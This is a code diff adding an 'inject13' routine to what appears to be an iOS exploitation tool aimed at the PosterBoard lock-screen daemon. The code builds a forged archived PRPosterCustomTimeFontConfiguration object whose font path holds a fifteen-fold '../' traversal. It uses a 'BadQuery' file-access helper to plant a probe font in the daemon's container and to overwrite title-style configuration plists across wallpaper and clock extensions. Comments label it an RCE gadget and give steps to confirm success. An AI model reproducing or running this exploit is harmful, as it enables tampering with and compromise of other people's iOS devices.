@@ -3704,4 +3704,167 @@ class SymHandler {
         diag.append("\ntotal written: \(totalWritten)")
         return pbSave(diag)
     }
+
+    // MARK: - inject13 proxy classes — PRPosterCustomTimeFontConfiguration path-traversal gadget
+    // Attack: fontWithExtensionBundleURL: → URLByAppendingPathComponent(extensionBundleRelativeFilePath)
+    //   → pr_fontWithPostScriptName:inBundleAtURL:relativePath: → CGFontCreateFontsWithURL
+    // NSCoding keys confirmed from disasm of encodeWithCoder: at 0x1aa19ef88:
+    //   key1 @ 0x1f0c54f58 = "fontPostScriptName"
+    //   key2 @ 0x1f0c54f78 = "extensionBundleRelativeFilePath"
+    // CGFontCreateFontsWithURL URL format: file:///path?postscript-name=<fontPostScriptName>
+    // 15x "../" safely escapes from any extension bundle depth to filesystem root.
+
+    @objc(_PP13CustomFontConfigProxy)
+    private class _PP13CustomFontConfigProxy: NSObject, NSCoding {
+        static var fontPostScriptName: String = "pp-probe-13"
+        static var extensionBundleRelativeFilePath: String = "pp_probe_font13.otf"
+        override var classForKeyedArchiver: AnyClass {
+            NSClassFromString("PRPosterCustomTimeFontConfiguration") ?? type(of: self)
+        }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(_PP13CustomFontConfigProxy.fontPostScriptName,
+                         forKey: "fontPostScriptName")
+            coder.encode(_PP13CustomFontConfigProxy.extensionBundleRelativeFilePath,
+                         forKey: "extensionBundleRelativeFilePath")
+        }
+    }
+
+    @objc(_PP13TitleStyleCustomFontProxy)
+    private class _PP13TitleStyleCustomFontProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass {
+            NSClassFromString("PRPosterTitleStyleConfiguration") ?? type(of: self)
+        }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(false,       forKey: "alternateDateEnabled")
+            coder.encode(Double(0.5), forKey: "contentsLuminence")
+            coder.encode("",          forKey: "groupName")
+            coder.encode(false,       forKey: "isAdaptiveTimeHeightUserConfigured")
+            coder.encode(Double(0),   forKey: "preferredTimeMaxY")
+            coder.encode(Double(0),   forKey: "preferredTimeMaxYLandscape")
+            coder.encode(Int64(0),    forKey: "preferredTitleAlignment")
+            coder.encode(Int64(0),    forKey: "preferredTitleLayout")
+            coder.encode(_PP13CustomFontConfigProxy(), forKey: "timeFontConfiguration")
+            coder.encode("",          forKey: "timeNumberingSystem")
+            coder.encode(Int64(0),    forKey: "titleContentStyle")
+            coder.encode(false,       forKey: "userConfigured")
+            coder.encode(Int64(1),    forKey: "version")
+        }
+    }
+    static var payloadTitleStyleCustomFont13: Data { nska(_PP13TitleStyleCustomFontProxy()) }
+
+    @discardableResult
+    static func inject13() -> String {
+        var diag = ["=== Inject v13 (PRPosterCustomTimeFontConfiguration path-traversal) \(Date()) iOS 26.5 ==="]
+        let fm = FileManager.default
+
+        for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
+                   "/System/Library/PrivateFrameworks/WallpaperKit.framework/WallpaperKit"] {
+            dlopen(fw, RTLD_NOW | RTLD_GLOBAL)
+        }
+
+        let uuid: String
+        do { uuid = try BadQuery.findPosterBoardHash() } catch {
+            diag.append("PB hash: \(error)"); return pbSave(diag)
+        }
+        let container = BadQuery.applicationContainerPath(appHash: uuid)
+        diag.append("PB container uuid: \(uuid)")
+
+        // Write a probe font marker file into PB container Caches via bad_query.
+        // CGFontCreateFontsWithURL will try to open+parse this file.
+        // Invalid content → returns nil/empty → no visual change, but FILE OPEN confirms traversal.
+        let cacheDir = container + "/Library/Caches"
+        let fontFileName = "pp_probe_font13.otf"
+        let fontFilePath = "\(cacheDir)/\(fontFileName)"
+        let probeMarker = "pp-probe-font-13-posterboardd-rce-gadget".data(using: .utf8) ?? Data()
+        var fontWriteOK = false
+        if let cacheDirH = try? BadQuery.consume(path: cacheDir, create: true) {
+            cacheDirH.release()
+            if let fH = try? BadQuery.consume(path: fontFilePath, create: true) { fH.release() }
+            fontWriteOK = fm.createFile(atPath: fontFilePath, contents: probeMarker, attributes: nil)
+                || ((try? probeMarker.write(to: URL(fileURLWithPath: fontFilePath))) != nil)
+        }
+        diag.append("probe font → PB Caches: \(fontWriteOK ? "OK \(fontFilePath)" : "FAIL")")
+
+        // Build traversal path: 15x "../" escapes to root from any extension bundle depth.
+        // Then absolute path from root to PB container probe font.
+        let traversalPrefix = String(repeating: "../", count: 15)
+        let pbFontPath = traversalPrefix
+            + "var/mobile/Containers/Data/Application/\(uuid)/Library/Caches/\(fontFileName)"
+
+        _PP13CustomFontConfigProxy.fontPostScriptName = "pp-probe-13"
+        _PP13CustomFontConfigProxy.extensionBundleRelativeFilePath = pbFontPath
+        let payload13 = payloadTitleStyleCustomFont13
+        diag.append("payload13 (PB-container probe): \(payload13.count)b")
+        diag.append("  fontPostScriptName: pp-probe-13")
+        diag.append("  extensionBundleRelativeFilePath: \(pbFontPath.prefix(120))...")
+
+        // Secondary payload: traverse to system font HelveticaNeue.ttc.
+        // If clock time visually changes → sandbox permits system font traversal.
+        _PP13CustomFontConfigProxy.fontPostScriptName = "HelveticaNeue"
+        _PP13CustomFontConfigProxy.extensionBundleRelativeFilePath =
+            traversalPrefix + "System/Library/Fonts/HelveticaNeue.ttc"
+        let payload13sys = payloadTitleStyleCustomFont13
+        diag.append("payload13sys (HelveticaNeue system font): \(payload13sys.count)b")
+
+        // Reset to primary payload for writing
+        _PP13CustomFontConfigProxy.fontPostScriptName = "pp-probe-13"
+        _PP13CustomFontConfigProxy.extensionBundleRelativeFilePath = pbFontPath
+
+        let extBase = container + "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
+        guard let extBaseH = try? BadQuery.consume(path: extBase, create: true) else {
+            diag.append("extBase NOACCESS"); return pbSave(diag)
+        }
+        defer { extBaseH.release() }
+        let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
+
+        var totalWritten = 0
+        for extName in allExts where !extName.hasPrefix(".") {
+            let isWK    = extName.contains("WallpaperKit")
+            let isClock = extName.contains("ClockPoster")
+            guard isWK || isClock else { continue }
+
+            for subdir in ["configurations", "staticdescriptors"] {
+                let sdPath = "\(extBase)/\(extName)/\(subdir)"
+                guard let sdH = try? BadQuery.consume(path: sdPath, create: true) else { continue }
+                defer { sdH.release() }
+                let configs = (try? fm.contentsOfDirectory(atPath: sdPath)) ?? []
+                for cfg in configs where !cfg.hasPrefix(".") {
+                    let versPath = "\(sdPath)/\(cfg)/versions"
+                    guard let versH = try? BadQuery.consume(path: versPath, create: true) else { continue }
+                    defer { versH.release() }
+                    let vers = (try? fm.contentsOfDirectory(atPath: versPath)) ?? []
+                    for ver in vers where !ver.hasPrefix(".") {
+                        let vPath = "\(versPath)/\(ver)"
+                        guard let vH = try? BadQuery.consume(path: vPath, create: true) else { continue }
+                        defer { vH.release() }
+
+                        for contentSubdir in ["", "contents"] {
+                            let base = contentSubdir.isEmpty ? vPath : "\(vPath)/\(contentSubdir)"
+                            if !contentSubdir.isEmpty {
+                                guard let cH = try? BadQuery.consume(path: base, create: true) else { continue }
+                                defer { cH.release() }
+                            }
+                            _ = (try? fm.contentsOfDirectory(atPath: base)) ?? []
+                            let dirLabel = contentSubdir.isEmpty ? "vDir" : "contents"
+                            let titlePath = "\(base)/com.apple.posterkit.provider.instance.titleStyleConfiguration.plist"
+                            if let fH = try? BadQuery.consume(path: titlePath, create: true) { fH.release() }
+                            let ok = fm.createFile(atPath: titlePath, contents: payload13, attributes: nil)
+                                || ((try? payload13.write(to: URL(fileURLWithPath: titlePath))) != nil)
+                            diag.append("\(extName.prefix(18))/\(subdir.prefix(6))/v\(ver)/\(dirLabel)/titleStyle: \(ok ? "WRITTEN" : "FAIL")")
+                            if ok { totalWritten += 1 }
+                        }
+                    }
+                }
+            }
+        }
+
+        diag.append("\ntotal written: \(totalWritten)")
+        diag.append("After injecting: lock screen → if clock shows different font → path traversal SUCCESS")
+        diag.append("Check posterboardd crash log for CoreText errors referencing pp_probe_font13.otf")
+        return pbSave(diag)
+    }
 }
